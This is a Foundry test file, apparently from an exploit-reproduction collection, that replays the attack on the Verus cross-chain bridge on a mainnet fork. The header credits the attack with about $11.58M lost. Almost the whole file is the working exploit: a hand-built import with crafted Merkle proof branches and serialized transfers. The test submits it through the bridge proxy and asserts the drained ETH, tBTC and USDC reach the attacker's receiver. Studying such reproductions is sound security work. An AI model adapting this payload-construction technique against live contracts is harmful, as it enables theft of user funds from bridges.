// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";
// @KeyInfo - Total Lost : ~$11.58M
// Attacker : https://etherscan.io/address/0x5abb91b9c01a5ed3ae762d32b236595b459d5777
// Attack Contract : https://etherscan.io/address/0x65cb8b128bf6e690761044cceca422bb239c25f9
// Vulnerable Contract : https://etherscan.io/address/0x71518580f36feceffe0721f06ba4703218cd7f63
// Attack Tx : https://etherscan.io/tx/0x6990f01720f57fc515d0e976a0c4f8157e0a9529194c4c15d190e98d087eb321
//
// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x71518580f36feceffe0721f06ba4703218cd7f63#code
//
// @Analysis
// Post-mortem : https://x.com/VerusCoin/status/2056829444124213652

contract VerusBridgeTest is Test {
    bytes32 internal constant TX_HASH = 0x6990f01720f57fc515d0e976a0c4f8157e0a9529194c4c15d190e98d087eb321;
    uint256 internal constant FORK_BLOCK = 25_118_334;
    address internal constant ATTACKER = 0x5aBb91B9c01A5Ed3aE762d32B236595B459D5777;
    address internal constant ATTACK_RECEIVER = 0x65Cb8b128Bf6e690761044CCECA422bb239C25F9;
    address internal constant BRIDGE_PROXY = 0x71518580f36FeCEFfE0721F06bA4703218cD7F63;
    address internal constant SUBMIT_IMPORTS = 0xa045cF963b79833faf445F555Ee1a6812d6fC87f;
    address internal constant VERUS_PROOF = 0x5E8060eCBf415AA25f12c1d67FdE832BD87DCFA1;
    address internal constant TOKEN_MANAGER = 0x08F0fBcc068C70A29326094110769ee5F1D0107d;
    address internal constant SERIALIZER = 0x796F4236c96E222B727df27978b3A77020356b88;
    address internal constant HASH_LIB = 0x40Ec84cA82fbF1b4D6A8EDb02BfFCf3Eb0400aAe;
    address internal constant MMR_LIB = 0x918d6f7EFE5a1707B83a2f0cF016CC5cf7983fFb;
    IVerusBridge internal constant BRIDGE = IVerusBridge(BRIDGE_PROXY);
    IERC20 internal constant TBTC = IERC20(0x18084fbA666a33d37592fA2633fD49a74DD93a88);
    IERC20 internal constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    address internal constant VERUS_ETH_CURRENCY = 0x454CB83913D688795E237837d30258d11ea7c752;
    address internal constant VERUS_TBTC_CURRENCY = 0xf87F6d4412dAd7c4452e8293850Df5327f02C308;
    address internal constant VERUS_USDC_CURRENCY = 0x1Bd15cDbf0B5B8c9CC361FFBaf6D76cc2CdfD667;

    uint256 internal constant ETH_DRAINED = 1_625_366_886_490_000_000_000;
    uint256 internal constant TBTC_DRAINED = 103_567_660_170_000_000_000;
    uint256 internal constant USDC_DRAINED = 147_658_836_798;

    uint64 internal constant ETH_IMPORT_AMOUNT = 162_536_688_649;
    uint64 internal constant TBTC_IMPORT_AMOUNT = 10_356_766_017;
    uint64 internal constant USDC_IMPORT_AMOUNT = 14_765_883_679_887;
    uint64 internal constant STANDARD_IMPORT_FEE = 20_000;
    uint64 internal constant USDC_IMPORT_FEE = 20_308;

    bytes32 internal constant CONFIRMED_STATE_ROOT = 0x2d61f232810a3b44da7a5a84253f8057d0cba756122fa50bb5f61fd6247fa757;

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);
        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_RECEIVER, "Attack Receiver");
        vm.label(BRIDGE_PROXY, "Verus Bridge Proxy");
        vm.label(SUBMIT_IMPORTS, "SubmitImports");
        vm.label(VERUS_PROOF, "VerusProof");
        vm.label(TOKEN_MANAGER, "TokenManager");
        vm.label(SERIALIZER, "Serializer");
        vm.label(HASH_LIB, "HashLib");
        vm.label(MMR_LIB, "MMRLib");
        vm.label(address(TBTC), "tBTC");
        vm.label(address(USDC), "USDC");
    }

    function testExploit() public {
        uint256 beforeEth = ATTACK_RECEIVER.balance;
        uint256 beforeTbtc = TBTC.balanceOf(ATTACK_RECEIVER);
        uint256 beforeUsdc = USDC.balanceOf(ATTACK_RECEIVER);

        vm.prank(ATTACKER, ATTACKER);
        // Bridge proxy -> SubmitImports._createImports -> VerusProof.proveImports -> TokenManager.processTransactions.
        BRIDGE.submitImports(_attackImport());

        uint256 stolenEth = ATTACK_RECEIVER.balance - beforeEth;
        uint256 stolenTbtc = TBTC.balanceOf(ATTACK_RECEIVER) - beforeTbtc;
        uint256 stolenUsdc = USDC.balanceOf(ATTACK_RECEIVER) - beforeUsdc;

        assertEq(stolenEth, ETH_DRAINED, "ETH drain mismatch");
        assertEq(stolenTbtc, TBTC_DRAINED, "tBTC drain mismatch");
        assertEq(stolenUsdc, USDC_DRAINED, "USDC drain mismatch");

        console.log("Stolen ETH", stolenEth);
        console.log("Stolen tBTC", stolenTbtc);
        console.log("Stolen USDC", stolenUsdc);
    }

    function _attackImport() internal pure returns (VerusObjects.CReserveTransferImport memory importData) {
        importData.partialtransactionproof.version = 1;
        importData.partialtransactionproof.typeC = 2;

        VerusObjects.CTXProof[] memory txproof = new VerusObjects.CTXProof[](3);
        bytes32[] memory branch = new bytes32[](4);
        branch[0] = 0xebb1cc631a6dd0c10e88de4393fe8573574b979e776eea6318cf41a7c6ca8d8e;
        branch[1] = 0xf1f8f848c560dd71380fc34a00ab661e7a753b91356d1c4656b3877bff5255e4;
        branch[2] = 0xa6993e48754abd6f4d2dd208b818a18dec47771e3151920cb3bfb5488cf3b87d;
        branch[3] = 0x181fe84a398c5f5cf083a7c92441ec034de08678a53675f32a517245536e5965;
        txproof[0].branchType = 2;
        txproof[0].proofSequence.CMerkleBranchBase = 2;
        txproof[0].proofSequence.nIndex = 1;
        txproof[0].proofSequence.nSize = 9;
        txproof[0].proofSequence.extraHashes = 0;
        txproof[0].proofSequence.branch = branch;

        branch = new bytes32[](1);
        branch[0] = 0x6e45c5038342ced986452e43a80617badb98f7906e48fc839ebc000000000000;
        txproof[1].branchType = 2;
        txproof[1].proofSequence.CMerkleBranchBase = 2;
        txproof[1].proofSequence.nIndex = 0;
        txproof[1].proofSequence.nSize = 2;
        txproof[1].proofSequence.extraHashes = 0;
        txproof[1].proofSequence.branch = branch;

        branch = new bytes32[](9);
        branch[0] = 0xf90c17804a390000000000000000000000000000000000000000000000000000;
        branch[1] = 0xfb9c2b9e70658b5a886b661821e3f90ef16dda8df940e2d0400c228a7b5287ff;
        branch[2] = 0x936e3cf4fc720000000000000000000000000000000000000000000000000000;
        branch[3] = 0x87634e882e06bc59986d86d2e0c38175777ea653e5424fa3d3a5ca046da588e4;
        branch[4] = 0x04ae45c0b4e1000000000000000000000e976b03a8d219000000000000000000;
        branch[5] = 0x6c2cafef2a0fb9abe5cdf497f93b8c61e54c3ed9c4135121a2766c84cb356ead;
        branch[6] = 0x36950b3220ceba000000000000000000d0665203cecf350f0000000000000000;
        branch[7] = 0x147fecfc3fd17087e46247f14d275c1c717a2ff3b8aa5411c432659391edc7d3;
        branch[8] = 0x4ca17e9cd202da0b1300000000000000021fd2082005b8f5447a0d0000000000;
        txproof[2].branchType = 3;
        txproof[2].proofSequence.CMerkleBranchBase = 3;
        txproof[2].proofSequence.nIndex = 4_071_017;
        txproof[2].proofSequence.nSize = 4_071_020;
        txproof[2].proofSequence.extraHashes = 1;
        txproof[2].proofSequence.branch = branch;
        importData.partialtransactionproof.txproof = txproof;

        VerusObjects.CComponents[] memory components = new VerusObjects.CComponents[](2);
        VerusObjects.CTXProof[] memory elProof = new VerusObjects.CTXProof[](1);

        components[0].elType = 1;
        components[0].elIdx = 0;
        components[0].elVchObj =
            hex"33a7f5b934fca59603d449337455e32d68b37dd8a5bc7b73d7c3c74d98e699f8010400000085202f890100000003000000000000000000000000000000861e3e000000000000000000";

        branch = new bytes32[](3);
        branch[0] = 0xe1d6e5bc258ce04b898310a3ede4518dbe08934f3feada389b5045265d453303;
        branch[1] = 0xf1b10e17a45cf67db3c78dc66badc5509cc660b821ae11790a6888c4ebd977fa;
        branch[2] = 0x9f7951aa385e9d4b6dc797b7aada3494b383c42544da2484b5d965d7aaac1d19;
        elProof[0].branchType = 2;
        elProof[0].proofSequence.CMerkleBranchBase = 2;
        elProof[0].proofSequence.nIndex = 0;
        elProof[0].proofSequence.nSize = 6;
        elProof[0].proofSequence.extraHashes = 0;
        elProof[0].proofSequence.branch = branch;
        components[0].elProof = elProof;

        elProof = new VerusObjects.CTXProof[](1);
        components[1].elType = 4;
        components[1].elIdx = 1;
        components[1].elVchObj = hex"0000000000000000b01a04030001011452047d0db35c330271aae70bedce996b5239ca5ccc4c9104030c01011452047d0db35c330271aae70bedce99"
            hex"6b5239ca5c4c75010008001af5b8015c64d39ab44c60ead8317f9f5a9b6c4c00a37ecd7f80fdbe3e5096124e7c8ca045b0b9e9e58b5595ee53ca9f3d96458145"
            hex"4cb83913d688795e237837d30258d11ea7c752454cb83913d688795e237837d30258d11ea7c7520000000000000300000080f7b73180f7b73100000075";

        branch = new bytes32[](2);
        branch[0] = 0xaaaff00a70df45727c6002e4c4dc57f0e2a1f58f0cab1a8c805a1d190c0916be;
        branch[1] = 0xe546fdbe2f25ec48d7b08bffc97c3d261cfaab94110f6721ddf918595ecb1148;
        elProof[0].branchType = 2;
        elProof[0].proofSequence.CMerkleBranchBase = 2;
        elProof[0].proofSequence.nIndex = 4;
        elProof[0].proofSequence.nSize = 6;
        elProof[0].proofSequence.extraHashes = 0;
        elProof[0].proofSequence.branch = branch;
        components[1].elProof = elProof;
        importData.partialtransactionproof.components = components;

        bytes memory ethAddressDestination =
            bytes.concat(bytes1(uint8(9)), bytes1(uint8(20)), abi.encodePacked(ATTACK_RECEIVER));

        importData.serializedTransfers = bytes.concat(
            _writeVarInt(1),
            abi.encodePacked(VERUS_ETH_CURRENCY),
            _writeVarInt(ETH_IMPORT_AMOUNT),
            _writeVarInt(1),
            abi.encodePacked(VERUS_ETH_CURRENCY),
            _writeVarInt(STANDARD_IMPORT_FEE),
            ethAddressDestination,
            abi.encodePacked(VERUS_ETH_CURRENCY),
            _writeVarInt(1),
            abi.encodePacked(VERUS_TBTC_CURRENCY),
            _writeVarInt(TBTC_IMPORT_AMOUNT),
            _writeVarInt(1),
            abi.encodePacked(VERUS_ETH_CURRENCY),
            _writeVarInt(STANDARD_IMPORT_FEE),
            ethAddressDestination,
            abi.encodePacked(VERUS_ETH_CURRENCY),
            _writeVarInt(1),
            abi.encodePacked(VERUS_USDC_CURRENCY),
            _writeVarInt(USDC_IMPORT_AMOUNT),
            _writeVarInt(1),
            abi.encodePacked(VERUS_ETH_CURRENCY),
            _writeVarInt(USDC_IMPORT_FEE),
            ethAddressDestination,
            abi.encodePacked(VERUS_ETH_CURRENCY)
        );
    }

    function _writeVarInt(uint256 value) internal pure returns (bytes memory out) {
        while (true) {
            uint8 b = uint8(value & 0x7f);
            if (out.length != 0) b = uint8(uint256(b) | 0x80);
            out = bytes.concat(abi.encodePacked(b), out);
            if (value <= 0x7f) break;
            value = (value >> 7) - 1;
        }
    }
}

library VerusObjects {
    struct CReserveTransferImport {
        CPtransactionproof partialtransactionproof;
        bytes serializedTransfers;
    }

    struct CMerkleBranch {
        uint8 CMerkleBranchBase;
        uint32 nIndex;
        uint32 nSize;
        uint8 extraHashes;
        bytes32[] branch;
    }

    struct CTXProof {
        uint8 branchType;
        CMerkleBranch proofSequence;
    }

    struct CComponents {
        uint8 elType;
        uint8 elIdx;
        bytes elVchObj;
        CTXProof[] elProof;
    }

    struct CPtransactionproof {
        uint8 version;
        uint8 typeC;
        CTXProof[] txproof;
        CComponents[] components;
    }
}

interface IVerusBridge {
    // 0x8c49b257: proxy slices calldata and delegatecalls contracts[8] with _createImports(bytes).
    function submitImports(VerusObjects.CReserveTransferImport calldata data) external;
}
